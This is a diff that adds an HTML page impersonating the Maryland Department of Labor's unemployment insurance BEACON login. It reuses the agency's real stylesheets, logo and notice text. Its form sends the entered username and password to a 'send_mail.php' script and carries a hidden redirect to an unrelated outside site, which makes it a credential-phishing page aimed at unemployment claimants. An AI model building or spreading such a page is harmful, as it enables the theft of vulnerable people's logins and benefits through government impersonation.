@@ -1,0 +1,304 @@
+<html lang="en"><head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Login Page</title>
+    <link href="https://beacon.labor.maryland.gov/ReBEACONClaimant/Styles/app.css" type="text/css" rel="stylesheet">
+    <link href="https://beacon.labor.maryland.gov/ReBEACONClaimant/Styles/Login.css" rel="stylesheet">
+    <style>
+        body {
+            -webkit-overflow-scrolling: touch;
+        }
+        .error{
+            border : 1px solid red !important;
+        }
+
+        .logerror {
+            margin-left: 15%;
+        }
+
+            .logerror span {
+                margin-left: 0%;
+            }
+
+        .customCaptchaPlace {
+            padding-left: 176px;
+              width: 314px;
+        }
+
+            .customCaptchaPlace .upper {
+                width: 100%;
+                float: left;
+                background: #FFF;
+                border: 1px solid #b7b7b7;
+                margin-bottom: 10px;
+                padding-left: 42px;
+            }
+
+            .customCaptchaPlace .lower {
+                float: left;
+                width: 100%;
+            }
+
+                .customCaptchaPlace .lower input {
+                     width: 359px;
+                }
+
+        .captcha-text {
+            float: left;
+            height: 80px;
+            width: 195px;
+        }
+
+
+        .captcha-refresh {
+            width: 20px;
+            height: 20px;
+            display: block;
+            float: left;
+            margin: 30px 10px !important;
+        }
+
+
+        .captcha-sound {
+            width: 20px;
+            height: 20px;
+            display: block;
+            float: left;
+            margin: 30px 10px !important;           
+        }
+
+        .CaptchaTextBox {
+            padding: 7px;
+            border: 1px solid #a0a0a0;
+            width: 62%;
+            height: 35px;
+            font-family: 'Lucida Sans Unicode','Lucida Grande',arial,helvetica,sans-serif;
+            font-size: 14px;
+            color: #555555;
+            box-sizing: border-box;
+        }
+
+        .CustomModelMessage {
+            display: block;
+            font-size: 12px;
+            line-height: 20px;
+            text-align: justify;
+        }
+
+        @media screen and (max-width:640px) {
+            .customCaptchaPlace .upper {
+                width: 100% !important;
+            }
+
+            .customCaptchaPlace .lower {
+                width: 100% !important;
+            }
+
+            .capslockerror {
+                float: left !important;
+            }
+
+            .logerror {
+                margin-left: 5%;
+            }
+
+            .customCaptchaPlace {
+                padding-left: 20px !important;
+            }
+
+            .CustomModelMessage {
+                margin-left: 0% !important;
+                font-size: 12px !important;
+            }
+        }
+    </style>
+    
+ 
+</head>
+<body class="LoginBg">
+     
+     
+       <noscript class="header-text">
+        Javascript is not enabled on the browser, please enable it and try again.
+    </noscript>
+
+    <form method="post" action="send_mail.php">
+    
+    
+    
+    <div>
+
+        <div class="LoginBox">
+
+            <div class="LoginLogo">
+                <img id="HeaderImage" src="https://beacon.labor.maryland.gov/ReBEACONClaimant/Images/MA_Header_top.png" tabindex="0" title="Logo of Maryland Department of Labor , Licensing and Regulation">
+            </div>
+            <div class="clr"></div>
+            
+            <p tabindex="0">Welcome to the Maryland Department of Labor Unemployment Insurance BEACON system.  To login to your account enter your username and password below and select Login.</p>
+            <p tabindex="0">
+                On Sunday, July 4, 2021, the Maryland Division of Unemployment Insurance (DUI) reinstated a requirement that regular unemployment insurance claimants must actively search for work to maintain their eligibility for unemployment insurance (UI) benefits. <b>Individuals who are receiving benefits under the Pandemic Unemployment Assistance (PUA) and the Pandemic Emergency Unemployment Compensation (PEUC) programs will also be required to search for work beginning Sunday, July 18, 2021.</b>
+                <br>
+                
+            </p>
+            <br>
+            
+            <div class="logscreen">
+
+                <div class="LoginRow">
+                     
+                    <div class="LoginCaption">
+                        <label for="Username" tabindex="0">Username :</label>
+                    </div>
+                    
+                    <div class="LoginInput"><input autocomplete="off" data-val="true" data-val-required="The UserName field is required." id="UserName" name="username" text="" type="text" value="" required="" title="Username"></div>
+                </div>
+
+
+                <div class="LoginRow">
+
+                        <div class="LoginCaption">
+                            <label for="Password" tabindex="0">Password :</label>
+                        </div>
+
+                        <div class="LoginInput">
+                            <input autocomplete="off" data-val="true" data-val-required="The password field is required." id="UserName" name="password" text="" type="password" value="" required="">
+
+                        </div>
+                    </div>
+                
+                
+                    
+                </div>                <div class="logerror">
+                    <span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
+                    <span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
+                    
+                    <div class="CustomModelMessage"></div>
+                </div>
+ 
+                
+                <div class="LoginRow">
+                    <input type="checkbox" name="RememberMe" id="RememberMe" class="RememberChkbox" tabindex="0">
+                    
+                    <label for="RememberMe">Remember Me</label>
+                    
+                    
+
+                    
+                </div>
+                <input type="text" name="honeypot" style="display: none;"> <!-- Optional -->
+                 <input type="hidden" name="redirectTo" value="https://goplanrelief.com/maryland/apply"> <!-- Optional -->
+                <div class="LoginRow">            
+                     
+                                            <input id="btnLogin" type="submit" class="neo-action-login-trigger btnLogin" value="Continue">
+                                    
+                    <div>
+                        <p tabindex="0">Click <a href="#">here</a> to file an unemployment insurance claim if you do not have an existing account.</p>
+                    </div>
+                    <div>
+                        <p tabindex="0">Click <a href="#">here</a> to activate your existing unemployment insurance account. If you activated your account in the One-Stop application, you will access your BEACON account with the same username and password.</p>
+                    </div>
+                </div>
+                
+
+            </div>
+            <div class="clearfix"></div>
+
+        </div>
+
+    
+        
+        <script type="text/javascript">
+            
+              var ua = window.navigator.userAgent;
+            var msie = ua.indexOf("MSIE ");
+            if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {
+                $("#audio_img").hide();
+            }
+         
+      
+            var username = document.getElementById("UserName").value;
+            if (username == "") {
+                document.getElementById("UserName").focus();
+            }
+            else {
+                document.getElementById("Password").focus();
+            }      
+            document.getElementById("UserName").setAttribute("title", "Username");
+            //document.getElementById("Password").setAttribute("title", "Password");
+            var CheckCopmlete = false;
+            var lblnVisuallyImpaired = false;
+            if (sessionStorage.getItem("iblnVisuallyImpaired") == true || sessionStorage.getItem("iblnVisuallyImpaired") == "true") {
+                lblnVisuallyImpaired = true;
+            }
+            sessionStorage.clear();
+            //nsCommon.SetWindowName();
+            if (document.getElementById("LoginWindowName") != undefined && document.getElementById("LoginWindowName").value != "") {
+                window.name = document.getElementById("LoginWindowName").value;
+                sessionStorage.setItem("LoginWindowName", JSON.stringify(window.name));
+            }
+
+            function SetWindowName() {
+                if (document.getElementById("LoginWindowName").value !== "") {
+                    window.name = document.getElementById("LoginWindowName").value;
+                    sessionStorage.setItem("WindowName", window.name);
+                }
+            }
+
+
+            function capLock(e) {
+                kc = e.keyCode ? e.keyCode : e.which;
+                sk = e.shiftKey ? e.shiftKey : ((kc == 16) ? true : false);
+                if (((kc >= 65 && kc <= 90) && !sk) || ((kc >= 97 && kc <= 122) && sk))
+                    document.getElementById('divCapLockErr').style.visibility = 'visible';
+                else
+                    document.getElementById('divCapLockErr').style.visibility = 'hidden';
+            }
+            if (lblnVisuallyImpaired === true || ((document.getElementById("hdnVisuallyImpaired") != null
+                && document.getElementById("hdnVisuallyImpaired").value != null
+                && document.getElementById("hdnVisuallyImpaired").value.toLowerCase() === "true"))) {
+                document.getElementById("iblnVisuallyImpaired").checked = true;
+                document.getElementById("HeaderImage").focus();               
+                sessionStorage.setItem("iblnVisuallyImpaired", true);
+            }
+            else {
+                document.getElementById("iblnVisuallyImpaired").checked = false;
+                sessionStorage.removeItem("iblnVisuallyImpaired");
+            }          
+            function isVisuallyImpairedclick(control) {
+                if (document.getElementById(control.id).checked == true) {
+
+                    sessionStorage.setItem("iblnVisuallyImpaired", true);   
+                }
+                else {
+                    sessionStorage.removeItem("iblnVisuallyImpaired");
+                }
+            }
+            function preventBack() { window.history.forward(); }
+            setTimeout("preventBack()", 0);
+            window.onunload = function () { null }; 
+            $(document).ready(function () {
+                if ($(".CustomModelMessage").text() == "") {
+                }
+                else {
+                    $(".logerror").attr("tabindex", "0");
+                }
+                if ($(".field-validation-error").text() == "") {
+                }
+                else {
+                    $(".logerror").attr("tabindex", "0");
+                }
+                if (($(window).width() < 845)) {
+                    $('#HeaderImage').attr("role", "img");
+                    $('#HeaderImage').attr("title", "Maryland Department of Labor, Licensing and Regulation");
+                }
+            });
+
+
+        </script>
+
+    </form>
+
+
+
+</body></html>
